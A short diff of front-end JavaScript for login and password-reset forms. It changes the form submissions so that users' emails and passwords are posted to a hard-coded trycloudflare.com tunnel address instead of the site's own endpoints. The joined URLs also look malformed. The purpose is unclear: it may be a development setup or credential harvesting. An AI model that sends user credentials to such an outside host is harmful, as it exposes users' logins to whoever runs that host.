@@ -1,7 +1,8 @@
 const form1 = document.getElementById('form1');
 const email1 = document.getElementById('email1');
 const password1 = document.getElementById('password1');
-const p1 = document.getElementById('p1')
+const p1 = document.getElementById('p1');
+const address = `https://tiny-belle-consolidation-foto.trycloudflare.com/sign.html`;
 form1.addEventListener('submit', async function(e){
     e.preventDefault();
     const email1In = email1.value;
@@ -31,7 +32,7 @@ form2.addEventListener('submit', async function(e) {
         e.preventDefault();
         const email2In = email2.value;
         const password2In = password2.value;
-        const form2Res = await fetch('/login', {
+        const form2Res = await fetch(`${address}/login`, {
             method:'POST',
             headers:{ 'content-type':'application/json' },
             credentials: 'include',
@@ -59,7 +60,7 @@ const textVisible = document.getElementById('forUp');
 formUp.addEventListener('submit', async function(e){
     e.preventDefault();
     const emailUpIn = emailUp.value;
-    const upPass = await fetch('/forgotUp',{
+    const upPass = await fetch(`${address}/forgotUp`,{
         method:'PATCH',
         headers:{ 'content-type':'application/json' },
         credentials:'include',
